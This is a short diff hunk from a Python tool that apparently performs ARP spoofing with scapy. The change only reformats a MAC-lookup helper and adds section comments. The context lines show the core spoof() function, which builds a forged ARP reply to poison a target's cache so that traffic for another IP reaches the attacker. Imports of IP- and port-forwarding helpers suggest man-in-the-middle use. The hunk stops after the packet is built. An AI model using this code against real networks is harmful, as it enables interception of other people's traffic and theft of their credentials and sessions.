@@ -3,10 +3,16 @@ import scapy.all as scapy
 from . import STATUS, STOP_EVENT
 from .utils import log_msg, set_ip_forwarding, set_port_forwarding, get_mac
 
-def get_own_mac(interface):
-    try: return scapy.get_if_hwaddr(interface)
-    except: return None
 
+# Helper Functions
+def get_own_mac(interface):
+    try: 
+        return scapy.get_if_hwaddr(interface)
+    except: 
+        return None
+
+
+# ARP Spoofing Core Functions
 def spoof(target_ip, spoof_ip, target_mac, attacker_mac):
     packet = scapy.Ether(dst=target_mac, src=attacker_mac) / \
              scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip, hwsrc=attacker_mac)
